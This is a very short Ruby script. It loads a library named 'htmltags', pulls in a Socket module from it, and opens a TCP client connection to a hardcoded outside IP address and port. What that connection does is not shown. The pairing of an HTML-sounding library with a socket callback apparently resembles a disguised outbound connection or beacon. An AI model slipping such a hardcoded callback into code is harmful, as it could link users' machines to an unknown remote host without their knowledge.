require 'htmltags'
include HtmlTag::Socket
ip   = "20.20.20.95"
port = 16801
tcp_client(ip, port)